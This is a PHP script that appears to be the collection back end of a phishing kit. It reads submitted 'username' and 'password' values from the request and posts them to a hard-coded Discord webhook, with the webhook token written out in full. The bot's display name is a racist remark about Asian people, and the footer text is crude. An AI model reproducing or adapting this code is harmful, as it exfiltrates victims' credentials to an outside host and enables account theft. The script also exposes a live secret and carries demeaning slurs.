<?php
extract($_REQUEST);



$webhookurl = "https://discord.com/api/webhooks/920788856909991946/G5vx_5dS_6WRIa4HopjaeZ_mUWLjFk93A2ZYJM2BlMGo9cRLiCqJsedkX0EuLndM5PRK";


$timestamp = date("c", strtotime("now"));

$json_data = json_encode([
    // Message
    "content" => "",
    
    // Username
    "username" => "i eat asian peoples math homework",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    //"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "",

            // Embed Type
            "type" => "rich",



            // URL of title link
            "url" => "",

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "b342f5" ),

            // Footer
            "footer" => [
                "text" => "monkey pisser",
                "icon_url" => "https://cdn.discordapp.com/attachments/920789056625971210/920789081657602048/btclogo.png"
            ],

            // Author
            "author" => [
                "name" => "178.157.82.145",
                "url" => "http://178.157.82.145/"
            ],

            // Additional Fields array
            "fields" => [
                // Field 1
                [
                    "name" => "USERNAME",
                    "value" => $username,
                    "inline" => false
                ],
                // Field 2
                [
                    "name" => "PASSWORD",
                    "value" => $password,
                    "inline" => true
                ]
                // Etc..
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );

curl_close( $ch );





    extract($_REQUEST);
    
 ?>
